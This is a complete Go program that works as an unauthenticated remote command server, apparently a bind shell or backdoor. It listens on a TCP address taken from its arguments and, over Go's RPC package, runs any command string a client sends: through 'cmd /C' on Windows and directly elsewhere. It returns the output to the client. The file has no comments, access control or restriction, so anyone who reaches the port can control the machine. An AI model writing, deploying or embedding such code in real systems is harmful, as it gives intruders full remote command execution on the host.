package main

import (
	"log"
	"net"
	"net/rpc"
	"os"
	"os/exec"
	"runtime"
)

type Listener int

func (l *Listener) GetLine(line []byte, res *string) error {
	cmd_string := string(line)
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", cmd_string)
	} else {
		cmd = exec.Command(cmd_string)
	}
	out, err := cmd.Output()
	if err != nil {
		*res = err.Error()
		return nil
	}
	out_str := string(out)
	*res = out_str
	return nil
}

func main() {
	addy, err := net.ResolveTCPAddr("tcp", os.Args[1])
	if err != nil {
		log.Fatal(err)
	}

	inbound, err := net.ListenTCP("tcp", addy)
	if err != nil {
		log.Fatal(err)
	}

	listener := new(Listener)
	rpc.Register(listener)
	rpc.Accept(inbound)
}
